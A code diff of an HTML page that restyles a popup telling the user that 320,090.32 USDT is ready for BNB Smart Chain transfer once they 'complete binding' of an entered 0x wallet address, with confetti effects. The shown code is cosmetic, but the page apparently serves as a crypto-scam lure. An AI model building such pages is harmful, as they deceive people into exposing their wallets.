@@ -251,7 +251,7 @@
     .footer-links a { color: #90caf9; text-decoration: none; font-weight: 500; }
     .footer-links a:hover { color: #64b5f6; }
 
-    /* CELEBRATORY POPUP */
+    /* PROFESSIONAL CELEBRATORY POPUP */
     .popup {
       position: fixed;
       top: 0; left: 0; width: 100%; height: 100%;
@@ -425,14 +425,14 @@
     </div>
   </div>
 
-  <!-- CELEBRATORY POPUP -->
+  <!-- PROFESSIONAL POPUP -->
   <div class="popup" id="successPopup">
     <div class="particles" id="particles"></div>
     <div class="popup-content">
       <div class="emoji">Checkmark</div>
-      <h2>COMPLETE BINDING!</h2>
-      <p>320,090.32 USDT transferred to BNB Smart Chain successfully!</p>
-      <button onclick="closePopup()">Close & Celebrate</button>
+      <h2>COMPLETE BINDING TO TRANSFER</h2>
+      <p>320,090.32 USDT ready for BNB Smart Chain transfer.</p>
+      <button onclick="closePopup()">Close</button>
     </div>
   </div>
 
@@ -459,34 +459,24 @@
       dropdown.style.display = dropdown.style.display === 'block' ? 'none' : 'block';
     }
 
-    // CELEBRATORY POPUP + CONFETTI
+    // POPUP + CELEBRATION
     function proceedTransfer() {
       const wallet = document.getElementById('walletInput').value.trim();
       if (wallet && wallet.length > 20 && wallet.startsWith('0x')) {
         const popup = document.getElementById('successPopup');
         popup.classList.add('show');
 
-        // CONFETTI EXPLOSION
+        // CONFETTI
         confetti({
           particleCount: 200,
           spread: 100,
           origin: { y: 0.6 },
           colors: ['#fbbf24', '#10b981', '#3b82f6', '#f59e0b']
         });
-        confetti({
-          particleCount: 100,
-          angle: 60,
-          spread: 80,
-          origin: { x: 0, y: 0.8 }
-        });
-        confetti({
-          particleCount: 100,
-          angle: 120,
-          spread: 80,
-          origin: { x: 1, y: 0.8 }
-        });
+        confetti({ particleCount: 100, angle: 60, spread: 80, origin: { x: 0, y: 0.8 } });
+        confetti({ particleCount: 100, angle: 120, spread: 80, origin: { x: 1, y: 0.8 } });
 
-        // GOLDEN PARTICLES
+        // GOLDEN RAIN
         setTimeout(() => {
           const particles = document.getElementById('particles');
           for (let i = 0; i < 50; i++) {
@@ -505,7 +495,6 @@
           }
         }, 300);
 
-        // POPUP ANIMATION
         setTimeout(() => {
           document.querySelector('.popup-content').style.transform = 'scale(1) rotate(0deg)';
         }, 100);
